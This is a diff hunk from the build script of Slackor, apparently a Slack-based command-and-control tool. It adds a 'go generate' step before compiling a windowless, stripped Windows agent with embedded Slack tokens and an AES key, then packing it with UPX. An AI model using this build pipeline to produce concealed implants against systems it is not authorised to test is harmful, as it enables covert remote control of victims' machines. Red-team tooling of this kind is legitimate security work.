@@ -22,6 +22,7 @@ for row in channels:
 conn.close()
 
 # Build exe and pack with UPX
+subprocess.run(["bash", "-c", "GO111MODULE=on go generate"])
 subprocess.run(["bash", "-c", "GO111MODULE=on GOOS=windows GOARCH=amd64 go build -o dist/agent.windows.exe -ldflags \"-s -w -H windowsgui -X github.com/Coalfire-Research/Slackor/internal/config.ResponseChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.RegistrationChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.CommandsChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.Bearer=%s -X github.com/Coalfire-Research/Slackor/internal/config.Token=%s -X github.com/Coalfire-Research/Slackor/internal/config.CipherKey=%s -X github.com/Coalfire-Research/Slackor/internal/config.SerialNumber=%s\" agent.go" % (responses, registration, commands, bearer, token, aes_key, '%0128x' % random.randrange(16**128))])
 subprocess.run(["bash", "-c", "cp -p dist/agent.windows.exe dist/agent.upx.exe"])
 subprocess.run(["bash", "-c", "upx --force dist/agent.upx.exe"])
